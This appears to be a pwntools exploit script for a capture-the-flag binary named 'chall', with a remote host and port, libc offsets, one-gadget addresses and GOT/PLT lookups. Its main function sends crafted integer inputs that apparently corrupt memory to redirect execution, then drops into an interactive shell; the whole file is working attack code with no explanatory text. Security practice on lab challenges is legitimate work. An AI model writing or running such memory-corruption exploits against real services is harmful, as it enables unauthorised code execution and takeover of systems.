from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "13.231.207.73"
PORT = 9005 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_printf = elf.got["printf"]
got_read = elf.got["read"]
plt_puts = elf.plt["puts"]
addr_main = elf.symbols["main"]
addr_calc = elf.symbols["calc_sum"]
addr_dtor = 0x600e18

libc = ELF('./libc-2.23.so')
off_read = 0xf7250
gadget = [0xf02a4, 0xf1147]
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	n = 15
	conn.sendlineafter("n = ", str(n))
	for i in range(10):
		conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(10)) # i
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(got_read-8*13))
	conn.sendlineafter(" = ", str(0x4006b6))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
